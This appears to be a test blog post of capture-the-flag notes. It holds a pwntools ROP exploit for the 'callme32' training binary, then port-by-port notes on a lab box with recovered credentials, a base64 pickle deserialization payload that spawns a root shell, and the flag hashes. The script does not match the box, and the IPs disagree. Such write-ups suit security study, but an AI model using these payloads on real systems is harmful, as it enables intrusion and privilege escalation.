> This is my first blog 

This is a test to see how it looks !

My IP : 10.8.253.221
Target IP : 10.10.54.223

### Rustscan
```bash
# These are the open ports
Open 10.10.136.101:22
Open 10.10.136.101:21
Open 10.10.136.101:7321
```


```py
from pwn import *

# Binary filename
exe = './callme32'

# get context of the binary
elf = context.binary = ELF(exe,checksec=False)

context.log_level = 'info'
context.delete_corefiles=True

io = process([exe])

offset = cyclic(100)

io.sendlineafter('>',offset)
io.wait()

# Open up the corefile
core=io.corefile

# Print out the address of ESP at the time of crashing
eip_value = core.eip
eip_offset = cyclic_find(eip_value)
info('located EIP offset at {a}'.format(a=eip_offset))

# Offset at 44

#################################################
io = process([exe])

callme_one=elf.symbols['callme_one']
callme_two=elf.symbols['callme_two']
callme_three=elf.symbols['callme_three']

info('Address of callme_one : %#X',callme_one)
info('Address of callme_two : %#X',callme_two)
info('Address of callme_three : %#X',callme_three)


rop = ROP(elf)
rop_gadget = rop.find_gadget(['pop esi','pop edi','pop ebp','ret'])[0]
info('Address of rop_gadget : %#X',rop_gadget)

payload = flat(
    asm('nop') * eip_offset,
    callme_one,
    rop_gadget,
    0xdeadbeef,
    0xcafebabe,
    0xd00df00d,
    callme_two,
    rop_gadget,
    0xdeadbeef,
    0xcafebabe,
    0xd00df00d,
    callme_three,
    rop_gadget,
    0xdeadbeef,
    0xcafebabe,
    0xd00df00d
)

io.sendlineafter('>',payload)
io.recv()
flag=io.recv().decode()
success(flag)
                                  
```

## PORT 21 [FTP]
```bash
creds
test.txt
```

## PORT 7321 []
```bash
nc 10.10.136.101 7321
username:?
password:?

python3 ape.py | grep user | cut -d "'" -f 4
gherkin
cat real_creds | cut -d "'" -f 4 
p1ckl3s_@11_@r0und_th3_w0rld

```


## PORT 22 [ssh]
```bash
gherkin:p1ckl3s_@11_@r0und_th3_w0rld

ps auxf
dill      1104  0.2  2.4 187884 12236 ?        Ssl  11:56   0:01 /usr/bin/python3 /var/cmd/.cmd_service.py

scp gherkin@10.10.54.223:/cmd_service.pyc .

https://www.decompiler.com/ 
gives the decompile version

dill
n3v3r_@_d1ll_m0m3nt

dill@ubuntu-xenial:~$ cat user.txt 
f1e13335c47306e193212c98fc07b6a0

User dill may run the following commands on ubuntu-xenial:
    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm

using ape3 
gASVHwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjARiYXNolIWUUpQu

root.txt :e88f0a01135c05cf0912cf4bc335ee28
```
